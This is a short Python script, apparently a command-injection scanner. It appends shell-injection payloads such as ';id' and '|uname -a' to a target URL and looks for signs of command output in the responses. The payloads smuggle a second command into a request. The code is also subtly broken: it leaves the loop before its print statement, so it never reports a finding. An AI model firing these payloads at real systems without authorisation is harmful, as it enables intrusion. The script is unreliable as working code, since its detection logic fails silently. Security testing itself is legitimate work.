import requests

target_url = 'http://example.com'
cmd_injection_payloads = [';id', '&id', '|id', '&&id', '||id', ';uname -a', '&uname -a', '|uname -a', '&&uname -a', '||uname -a']

def cmd_injection_scanner(target_url, payloads):
    for payload in payloads:
        vulnerable = False
        try:
            r = requests.get(target_url + payload)
            if "uid=" in r.text or "gid=" in r.text or "Linux" in r.text:
                vulnerable = True
                break
        except requests.exceptions.RequestException:
            pass

        if vulnerable:
            print(f"Potential Command Injection vulnerability: {target_url}")

cmd_injection_scanner(target_url, cmd_injection_payloads)
